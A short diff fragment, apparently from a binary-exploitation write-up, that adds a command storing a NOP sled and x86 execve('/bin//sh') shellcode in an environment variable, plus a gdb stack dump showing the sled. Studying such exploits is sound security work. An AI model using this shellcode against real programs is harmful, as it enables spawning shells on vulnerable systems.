@@ -34,7 +34,10 @@ Dump of assembler code for function exit@plt:
 ```
 
 ```
+export shellcode=$(python -c 'print "\x90" * 300 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+```
 
+```
 x/600wx $esp
 0xffffde60:	0x90909090	0x90909090	0x90909090	0x90909090
 
